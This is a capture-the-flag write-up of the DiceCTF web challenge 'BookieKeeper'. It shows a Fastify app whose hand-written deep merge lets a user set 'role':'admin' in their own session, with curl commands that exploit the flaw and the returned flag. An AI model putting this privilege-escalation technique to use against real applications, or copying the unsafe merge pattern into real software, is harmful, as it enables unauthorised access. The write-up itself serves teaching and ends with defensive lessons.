---
title: "Web CTF writeup — DiceCTF \"BookieKeeper\""
date: 2026-03-28 21:00:00 -0300
read_time: 6
tags: [web, ctf, writeup]
excerpt: "A prototype-pollution gadget hidden inside a Fastify session middleware. Felt obvious in retrospect; took me four hours."
---

BookieKeeper was a 250-point web challenge at DiceCTF this year. A small Fastify app that lets you save bookmarks, bound to your session. The flag was readable as the admin user. No SSRF, no SQLi, no obvious XSS sink. Took me four hours and a long walk.

## Recon

Three routes: `POST /login`, `POST /save`, `GET /me`. Sessions handled by `@fastify/secure-session`. The interesting bit, surfaced quickly:

```javascript
fastify.post('/save', async (req, reply) => {
  const body = req.body;            // JSON, no schema
  const session = req.session.get('data') || {};

  // "deep merge" — written by hand, of course
  merge(session, body);

  req.session.set('data', session);
  reply.send({ ok: true });
});
```

The `merge` helper was the one you've seen a hundred times — recursive, no key check, copies anything onto anything. So: prototype pollution, but into the *session payload*, not into a global. Fine. Now what?

## The gadget

Whenever the session is read, Fastify deserializes it and your polluted keys come back as own-properties of `req.session`'s data object. The admin route did this:

```javascript
fastify.get('/me', async (req) => {
  const data = req.session.get('data') || {};

  if (data.role === 'admin') {
    return { user: data.name, flag: process.env.FLAG };
  }
  return { user: data.name || 'guest' };
});
```

Read the bug? `data.role` is read from a plain object, but the merge let me set *any* key on it — including `role`. There's no allowlist. Three hours in, I was looking for a fancy `__proto__` chain. There wasn't one. The intended bug was just: write the key directly.

## Exploit

```bash
# 1. log in as a normal user, grab the cookie
curl -s -c jar -X POST $URL/login \
     -H 'content-type: application/json' \
     -d '{"name":"igor","pw":"hunter2"}'

# 2. pollute our own session payload
curl -s -b jar -X POST $URL/save \
     -H 'content-type: application/json' \
     -d '{"role":"admin"}'

# 3. read the flag
curl -s -b jar $URL/me
```

The reply:

```json
{
  "user": "igor",
  "flag": "dice{merge_is_not_an_authz_primitive}"
}
```

The flag is the lesson. The mental block for me was assuming the trick was *where* in the prototype chain the gadget lived; the real trick was that `data` is just an object, sessions are user-controlled, and `data.role` never had any business being readable from the request side at all.

## Take-aways I wrote on a sticky note

- Schema-validate every body before you touch it — Fastify has `schema` built in; use it.
- Server-only fields belong in a different store, or at least a different key prefix you never merge into.
- "Deep merge" is rarely what you want. Set the keys you mean.
